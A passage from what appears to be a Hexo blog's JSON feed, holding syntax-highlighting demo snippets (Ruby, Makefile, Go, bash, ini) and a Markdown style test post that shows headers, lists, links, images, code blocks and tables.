punctuation\">.</span>capitalize</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">salute</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    puts <span class=\"token string\">\"Hello <span class=\"token interpolation\"><span class=\"token delimiter tag\">#&#123;</span><span class=\"token variable\">@name</span><span class=\"token delimiter tag\">&#125;</span></span>!\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token constant\">Greeter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>g<span class=\"token punctuation\">.</span>salute</pre></td></tr></table></figure><figure class=\"highlight makefile\"><figcaption data-lang=\"makefile\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Makefile</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>BUILDDIR      <span class=\"token operator\">=</span> _build</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>EXTRAS       <span class=\"token operator\">?=</span> <span class=\"token variable\">$</span><span class=\"token punctuation\">(</span>BUILDDIR<span class=\"token punctuation\">)</span>/extras</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin\">.PHONY</span><span class=\"token punctuation\">:</span> main clean</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token symbol\">main</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token operator\">@</span>echo <span class=\"token string\">\"Building main facility...\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tbuild_main <span class=\"token variable\">$</span><span class=\"token punctuation\">(</span>BUILDDIR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token symbol\">clean</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\trm -rf <span class=\"token variable\">$</span><span class=\"token punctuation\">(</span>BUILDDIR<span class=\"token punctuation\">)</span>/*</pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> main</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    ch <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1.0e10</span>    <span class=\"token comment\">// magic number</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    x<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span> ch</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">defer</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>`exitting now\\`<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">go</span> <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token shebang important\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">###### CONFIG</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token assign-left variable\">ACCEPTED_HOSTS</span><span class=\"token operator\">=</span><span class=\"token string\">\"/root/.hag_accepted.conf\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token assign-left variable\">BE_VERBOSE</span><span class=\"token operator\">=</span>false</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"<span class=\"token environment constant\">$UID</span>\"</span> -ne <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Superuser rights required\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token builtin class-name\">exit</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function-name function\">genApacheConf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token builtin class-name\">echo</span> -e <span class=\"token string\">\"# Host <span class=\"token variable\">$&#123;HOME_DIR&#125;</span><span class=\"token variable\">$1</span>/<span class=\"token variable\">$2</span> :\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight ini\"><figcaption data-lang=\"ini\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">; boilerplate</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">package</span><span class=\"token punctuation\">]</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key attr-name\">name</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">\"<span class=\"token inner-value\">some_name</span>\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token key attr-name\">authors</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">[\"Author\"]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token key attr-name\">description</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">\"This is \\</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a description\"</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token punctuation\">[</span><span class=\"token section-name selector\">[lib</span><span class=\"token punctuation\">]</span></span>]</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token key attr-name\">name</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">$&#123;NAME&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token key attr-name\">default</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">True</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token key attr-name\">auto</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">no</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token key attr-name\">counter</span> <span class=\"token punctuation\">=</span> <span class=\"token value attr-value\">1_000</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/markdown/",
            "url": "https://zephyr-cyber.github.io.git/markdown/",
            "title": "Markdown Style test",
            "date_published": "2018-07-24T15:31:06.000Z",
            "content_html": "<p>This post is originated from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vYXBhY2tlZXIvNDE1OTI2OA==\">here</span> and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.</p>\n<p><span id=\"more\"></span></p>\n<hr />\n<h2 id=\"headers\"><a class=\"anchor\" href=\"#headers\">#</a> Headers</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">#</span> H1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">##</span> H2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">###</span> H3</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">####</span> H4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">#####</span> H5</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">######</span> H6</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Alternatively, for H1 and H2, an underline-ish style:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token title important\">Alt-H1</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">======</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token title important\">Alt-H2</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">------</span></span></pre></td></tr></table></figure><h1 id=\"h1\"><a class=\"anchor\" href=\"#h1\">#</a> H1</h1>\n<h2 id=\"h2\"><a class=\"anchor\" href=\"#h2\">#</a> H2</h2>\n<h3 id=\"h3\"><a class=\"anchor\" href=\"#h3\">#</a> H3</h3>\n<h4 id=\"h4\"><a class=\"anchor\" href=\"#h4\">#</a> H4</h4>\n<h5 id=\"h5\"><a class=\"anchor\" href=\"#h5\">#</a> H5</h5>\n<h6 id=\"h6\"><a class=\"anchor\" href=\"#h6\">#</a> H6</h6>\n<p>Alternatively, for H1 and H2, an underline-ish style:</p>\n<h1 id=\"alt-h1\"><a class=\"anchor\" href=\"#alt-h1\">#</a> Alt-H1</h1>\n<h2 id=\"alt-h2\"><a class=\"anchor\" href=\"#alt-h2\">#</a> Alt-H2</h2>\n<h2 id=\"emphasis\"><a class=\"anchor\" href=\"#emphasis\">#</a> Emphasis</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Emphasis, aka italics, with <span class=\"token italic\"><span class=\"token punctuation\">*</span><span class=\"token content\">asterisks</span><span class=\"token punctuation\">*</span></span> or <span class=\"token italic\"><span class=\"token punctuation\">_</span><span class=\"token content\">underscores</span><span class=\"token punctuation\">_</span></span>.</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Strong emphasis, aka bold, with <span class=\"token bold\"><span class=\"token punctuation\">**</span><span class=\"token content\">asterisks</span><span class=\"token punctuation\">**</span></span> or <span class=\"token bold\"><span class=\"token punctuation\">__</span><span class=\"token content\">underscores</span><span class=\"token punctuation\">__</span></span>.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Combined emphasis with <span class=\"token bold\"><span class=\"token punctuation\">**</span><span class=\"token content\">asterisks and <span class=\"token italic\"><span class=\"token punctuation\">_</span><span class=\"token content\">underscores</span><span class=\"token punctuation\">_</span></span></span><span class=\"token punctuation\">**</span></span>.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Strikethrough uses two tildes. <span class=\"token strike\"><span class=\"token punctuation\">~~</span><span class=\"token content\">Scratch this.</span><span class=\"token punctuation\">~~</span></span></pre></td></tr></table></figure><p>Emphasis, aka italics, with <em>asterisks</em> or <em>underscores</em>.</p>\n<p>Strong emphasis, aka bold, with <strong>asterisks</strong> or <strong>underscores</strong>.</p>\n<p>Combined emphasis with <strong>asterisks and <em>underscores</em></strong>.</p>\n<p>Strikethrough uses two tildes. <s>Scratch this.</s></p>\n<h2 id=\"lists\"><a class=\"anchor\" href=\"#lists\">#</a> Lists</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token list punctuation\">1.</span> First ordered list item</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token list punctuation\">2.</span> Another item</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token list punctuation\">*</span> Unordered sub-list.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token list punctuation\">1.</span> Actual numbers don't matter, just that it's a number</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token list punctuation\">1.</span> Ordered sub-list</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token list punctuation\">4.</span> And another item.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown).</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   To have a line break without a paragraph, you will need to use two trailing spaces.  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   Note that this line is separate, but within the same paragraph.  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token list punctuation\">*</span> Unordered list can use asterisks</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token list punctuation\">-</span> Or minuses</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token list punctuation\">+</span> Or pluses</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token list punctuation\">-</span> Paragraph In unordered list</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  For example like this.</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Common Paragraph with some text.</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>And more text.</pre></td></tr></table></figure><ol>\n<li>First ordered list item</li>\n<li>Another item</li>\n</ol>\n<ul>\n<li>Unordered sub-list.</li>\n</ul>\n<ol>\n<li>\n<p>Actual numbers don't matter, just that it's a number</p>\n</li>\n<li>\n<p>Ordered sub-list</p>\n</li>\n<li>\n<p>And another item.</p>\n<p>You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown).</p>\n<p>To have a line break without a paragraph, you will need to use two trailing spaces.<br />\nNote that this line is separate, but within the same paragraph.<br />\n(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p>\n</li>\n</ol>\n<ul>\n<li>Unordered list can use asterisks</li>\n</ul>\n<ul>\n<li>Or minuses</li>\n</ul>\n<ul>\n<li>Or pluses</li>\n</ul>\n<ul>\n<li>\n<p>Paragraph In unordered list</p>\n<p>For example like this.</p>\n</li>\n</ul>\n<p>Common Paragraph with some text.<br />\nAnd more text.</p>\n<h2 id=\"inline-html\"><a class=\"anchor\" href=\"#inline-html\">#</a> Inline HTML</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>To reboot your computer, press <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>kbd</span><span class=\"token punctuation\">></span></span>ctrl<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>kbd</span><span class=\"token punctuation\">></span></span>+<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>kbd</span><span class=\"token punctuation\">></span></span>alt<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>kbd</span><span class=\"token punctuation\">></span></span>+<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>kbd</span><span class=\"token punctuation\">></span></span>del<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>kbd</span><span class=\"token punctuation\">></span></span>.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>&lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt;</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dl</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dt</span><span class=\"token punctuation\">></span></span>Definition list<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dd</span><span class=\"token punctuation\">></span></span>Is something people use sometimes.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dd</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token code keyword\">    &lt;dt>Markdown in HTML&lt;/dt></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    &lt;dd>Does *not* work **very** well. Use HTML &lt;em>tags&lt;/em>.&lt;/dd></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dl</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>&lt;dl&gt;<br />\n&lt;dt&gt;Definition list&lt;/dt&gt;<br />\n&lt;dd&gt;Is something people use sometimes.&lt;/dd&gt;</p>\n<pre><code>&lt;dt&gt;Markdown in HTML&lt;/dt&gt;\n&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;\n</code></pre>\n<p>&lt;/dl&gt;</p>\n<h2 id=\"links\"><a class=\"anchor\" href=\"#links\">#</a> Links</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">I'm an inline-style link</span>](<span class=\"token url\">https://www.google.com</span>)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">I'm an inline-style link with title</span>](<span class=\"token url\">https://www.google.com</span> <span class=\"token string\">\"Google's Homepage\"</span>)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">I'm a reference-style link</span>][<span class=\"token variable\">Arbitrary case-insensitive reference text</span>]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">I'm a relative reference to a repository file</span>](<span class=\"token url\">../blob/master/LICENSE</span>)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">You can use numbers for reference-style link definitions</span>][<span class=\"token variable\">1</span>]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Or leave it empty and use the [link text itself]</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Some text to show that the reference links can follow later.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token url-reference url\"><span class=\"token punctuation\">[</span><span class=\"token variable\">arbitrary case-insensitive reference text</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> https://hexo.io</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token url-reference url\"><span class=\"token punctuation\">[</span><span class=\"token variable\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> https://hexo.io/docs/</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token url-reference url\"><span class=\"token punctuation\">[</span><span class=\"token variable\">link text itself</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> https://hexo.io/api/</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==\">I'm an inline-style link</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==\">I'm an inline-style link with title</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlv\">I'm a reference-style link</span></p>\n<p><a href=\"../blob/master/LICENSE\">I'm a relative reference to a repository file</a></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">You can use numbers for reference-style link definitions</span></p>\n<p>Or leave it empty and use the <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2FwaS8=\">link text itself</span></p>\n<p>Some text to show that the reference links can follow later.</p>\n<h2 id=\"images\"><a class=\"anchor\" href=\"#images\">#</a> Images</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hover to see the title text:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Inline-style:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token url\"><span class=\"token operator\">!</span>[<span class=\"token content\">alt text</span>](<span class=\"token url\">https://hexo.io/icon/favicon-196x196.png</span> <span class=\"token string\">\"Logo Title Text 1\"</span>)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Reference-style:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token url\"><span class=\"token operator\">!</span>[<span class=\"token content\">alt text</span>][<span class=\"token variable\">logo</span>]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token url-reference url\"><span class=\"token punctuation\">[</span><span class=\"token variable\">logo</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> https://hexo.io/icon/favicon-196x196.png <span class=\"token string\">\"Logo Title Text 2\"</span></span></pre></td></tr></table></figure><p>hover to see the title text:</p>\n<p>Inline-style:</p>\n<p><img data-src=\"https://hexo.io/icon/favicon-196x196.png\" alt=\"alt text\" title=\"Logo Title Text 1\" /></p>\n<p>Reference-style:<br />\n<img data-src=\"https://hexo.io/icon/favicon-196x196.png\" alt=\"alt text\" title=\"Logo Title Text 2\" /></p>\n<h2 id=\"code-and-syntax-highlighting\"><a class=\"anchor\" href=\"#code-and-syntax-highlighting\">#</a> Code and Syntax Highlighting</h2>\n<p>Inline  <code>code</code>  has  <code>back-ticks around</code>  it.</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"JavaScript syntax highlighting\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"Python syntax highlighting\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span> s</pre></td></tr></table></figure><pre><code>No language indicated, so no syntax highlighting.\nBut let's throw in a &lt;b&gt;tag&lt;/b&gt;.\n</code></pre>\n<h2 id=\"tables\"><a class=\"anchor\" href=\"#tables\">#</a> Tables</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token table\"><span class=\"token table-header-row\"><span class=\"token punctuation\">|</span><span class=\"token table-header important\">                </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\">ASCII                          </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\">HTML                         </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></span><span class=\"token table-line\"><span class=\"token punctuation\">|</span><span class=\"token punctuation\">----------------</span><span class=\"token punctuation\">|</span><span class=\"token punctuation\">-------------------------------</span><span class=\"token punctuation\">|</span><span class=\"token punctuation\">-----------------------------</span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></span><span class=\"token table-data-rows\"><span class=\"token punctuation\">|</span><span class=\"token table-data\">Single backticks</span><span class=\"token punctuation\">|</span><span class=\"token table-data\"><span class=\"token code-snippet code keyword\">`'Isn't this fun?'`</span>            </span><span class=\"token punctuation\">|</span><span class=\"token table-data\">'Isn't this fun?'            </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">|</span><span class=\"token table-data\">Quotes          </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"><span class=\"token code-snippet code keyword\">`\"Isn't this fun?\"`</span>            </span><span class=\"token punctuation\">|</span><span class=\"token table-data\">\"Isn't this fun?\"            </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">|</span><span class=\"token table-data\">Dashes          </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"><span class=\"token code-snippet code keyword\">`-- is en-dash, --- is em-dash`</span></span><span class=\"token punctuation\">|</span><span class=\"token table-data\">-- is en-dash, --- is em-dash</span><span class=\"token punctuation\">|</span></span></span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th></th>\n<th>ASCII</th>\n<th>HTML</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Single backticks</td>\n<td><code>'Isn't this fun?'</code></td>\n<td>'Isn't this fun?'</td>\n</tr>\n<tr>\n<td>Quotes</td>\n<td><code>&quot;Isn't this fun?&quot;</code></td>\n<td>&quot;Isn't this fun?&quot;</td>\n</tr>\n<tr>\n<td>Dashes</td>\n<td><code>-- is en-dash, --- is em-dash</code></td>\n<td>-- is en-dash, --- is em-dash</td>\n</tr>\n</tbody>\n</table>\n<p>Colons can be used to align columns.</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token table\"><span class=\"token table-header-row\"><span class=\"token punctuation\">|</span><span class=\"token table-header important\"> Tables        </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\"> Are           </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\"> Cool  </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></span><span class=\"token table-line\"><span class=\"token punctuation\">|</span> <span class=\"token punctuation\">-------------</span> <span class=\"token punctuation\">|</span><span class=\"token punctuation\">:-------------:</span><span class=\"token punctuation\">|</span> <span class=\"token punctuation\">-----:</span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></span><span class=\"token 